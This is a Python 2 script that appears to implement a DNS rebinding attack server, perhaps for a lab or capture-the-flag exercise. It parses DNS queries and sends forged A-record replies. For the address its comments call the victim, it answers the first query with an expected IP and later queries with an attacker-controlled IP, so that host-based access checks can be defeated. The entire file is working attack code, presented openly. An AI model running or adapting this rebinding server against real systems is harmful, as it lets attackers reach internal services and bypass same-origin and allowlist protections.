import socket
from time import time

class DNSQuery:
	def __init__(self, data):
		self.data = data
		self.domain = ''
		self.qtype = 0

		opcode = (ord(data[2]) >> 3) & 15
		if opcode == 0:
			ini = 12
			lon = ord(data[ini])
			while lon != 0:
				self.domain += data[ini+1:ini+lon+1] + '.'
				ini += lon + 1
				lon = ord(data[ini])
			self.qtype = ord(data[12+len(self.domain)+2])

	def reply(self, ip):
		packet = ''
		if self.domain:
			packet += self.data[:2] + '\x81\x80'
			packet += self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'
			packet += self.data[12:12+len(self.domain)+5] # original question
			packet += '\xc0\x0c'
			packet += '\x00\x01\x00\x01\x00\x00\x00\x01\x00\x04' # response type, ttl, resource data length (4 bytes)
			packet += ''.join(chr(int(x)) for x in ip.split('.'))
		return packet

if __name__ == '__main__':
	udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	udp.bind(('',54))

	firstRequest = True # Track if first request
	ip = "127.0.0.1" # Default IP
	try:
		while 1:
			data, addr = udp.recvfrom(1024)
			print "Got request from: ", addr[0]
			p = DNSQuery(data)

			# only IN A questions are supported
			if p.domain and p.qtype == 1:
				if addr[0] == "127.0.0.1": # if request from victim IP
					print "Got request from victim"
					
					if firstRequest: # First request, send fake IP the victim expects/wants
						ip = "10.10.10.10"
						firstRequest = False
					else: # if its the second request send our IP
						ip = "11.11.11.11"
					print '%s -> %s' % (p.domain, ip)
				udp.sendto(p.reply(ip), addr)

	except KeyboardInterrupt:
		udp.close()
